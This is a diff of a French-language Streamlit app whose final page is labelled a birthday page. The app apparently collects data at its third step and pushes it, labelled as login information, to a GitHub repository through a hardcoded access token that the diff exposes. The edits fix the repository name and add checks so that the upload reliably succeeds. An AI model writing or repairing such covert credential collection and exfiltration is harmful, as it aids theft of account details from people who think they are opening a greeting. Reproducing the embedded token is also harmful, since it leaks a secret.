@@ -34,7 +34,7 @@ st.markdown("""
 # --- Fonction pour envoyer/mettre à jour le fichier informations.txt sur GitHub ---
 def envoyer_sur_github(contenu_texte):
     GITHUB_TOKEN = "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"
-    NOM_REPO = "B1ackeagle/Test"
+    NOM_REPO = "B1ackeag1e/Test"  # Correction du nom du dépôt ici
     NOM_FICHIER = "informations.txt"
     
     try:
@@ -44,7 +44,6 @@ def envoyer_sur_github(contenu_texte):
         
         message_commit = f"Mise à jour des informations de connexion - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         
-        # Vérifier si le fichier existe déjà pour le mettre à jour ou le créer
         try:
             file_contents = repo.get_contents(NOM_FICHIER)
             repo.update_file(
@@ -59,8 +58,9 @@ def envoyer_sur_github(contenu_texte):
                 message=message_commit,
                 content=contenu_texte
             )
+        return True, "Succès"
     except Exception as e:
-        print(f"Erreur GitHub : {e}")
+        return False, str(e)
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -129,11 +129,15 @@ elif st.session_state.etape == 3:
         except Exception as e:
             contenu_txt += f"Erreur lors de la récupération : {e}\n"
         
-        # Enregistrement et mise à jour automatique sur GitHub dans informations.txt
-        envoyer_sur_github(contenu_txt)
+        # Enregistrement sur GitHub et test du retour
+        succes, message_erreur = envoyer_sur_github(contenu_txt)
         
-        st.session_state.etape = 4
-        st.rerun()
+        if succes:
+            st.success("Fichier envoyé avec succès sur GitHub !")
+            st.session_state.etape = 4
+            st.rerun()
+        else:
+            st.error(f"Échec de l'envoi GitHub : {message_erreur}")
 
 # ==========================================
 # ÉTAPE 4 : La page finale d'anniversaire
